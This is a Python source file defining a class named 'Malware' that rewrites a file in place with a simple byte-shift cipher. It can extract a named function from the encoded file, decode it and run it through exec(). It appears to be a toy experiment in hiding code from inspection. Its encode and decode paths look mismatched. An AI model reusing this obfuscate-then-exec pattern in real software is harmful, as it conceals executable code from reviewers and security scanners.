import time
class Malware:
    def __init__(self, loc):
        self.loc = loc

    def encrypt_file(self):
        encrypted = []
        fun_start = b"def "
        for line in open(self.loc, "rb"):
            if line.startswith(fun_start):
                nl = 10
                encrypted.append((nl + 1).to_bytes(1, 'little'))
                encrypted.append((nl + 1).to_bytes(1, 'little'))
                for byte in line:
                    encrypted.append((byte + 1).to_bytes(1, 'little'))

            else:
                for byte in line:
                    encrypted.append((byte + 2).to_bytes(1, 'little'))
        with open(self.loc, "wb") as f:
            for line in encrypted:
                f.write(line)
        return True

    def runtime_encrypt(self):
        encrypted = []
        for line in open(self.loc, "rb"):
            for byte in line:
                encrypted.append((byte + 1).to_bytes(1, 'little'))
        with open(self.loc, "wb") as f:
            for line in encrypted:
                f.write(line)
        return True

    def decrypt_file(self):
        decrypted = []
        for line in open(self.loc, "rb"):
            for byte in line:
                decrypted.append((byte - 1).to_bytes(1, 'little'))
        with open(self.loc, "wb") as f:
            for line in decrypted:
                f.write(line)

        return True
    
    def decrypt_file_fully(self):
        self.decrypt_file()
        decrypted = []
        start = False
        for line in open(self.loc, "rb"):
            if line.decode().strip().startswith("def "):
                decrypted.append(line)
                start = True
                continue
            elif start:
                if line == b'\n':
                    decrypted.append(b"\n")
                else:    
                    for byte in line:
                        decrypted.append((byte - 1).to_bytes(1, 'little'))

        with open(self.loc, "wb") as f:
            for line in decrypted:
                f.write(line)

        return True

    def getFunc(self, name):
        loc = self.loc
        code = []
        found = False
        for line in open(loc, "rb"):
            if not found:
                stri = f"def {name}("
                if line.startswith(stri.encode()):
                    found = True
                    code.append(line)
                    continue
            else:
                if not line.decode().strip():
                    break
                else:
                    code.append(line)
        code = b''.join(code)
        return Func(name, code)


class Func:
    def __init__(self, name, code):
        self.name = name
        self.code = code

    def code_decrypt(self):
        decrypted = []
        code = self.code
        nl = 10
        decrypt = False
        for i in code:
            if i == nl:
                decrypt = True
            if decrypt:
                decrypted.append(((i - 1).to_bytes(1, 'little')))
            else:
                decrypted.append(i.to_bytes(1, 'little'))
        for byte in range(len(decrypted)):
            try:
                if decrypted[byte] == b"\r" and decrypted[byte + 1] == b"\t":
                    decrypted[byte + 1] = b"\n"
            except:
                continue

        code_decrypt = b''.join(decrypted)
        self.code = code_decrypt

        return code_decrypt

    def exec(self):
        exec(self.code)
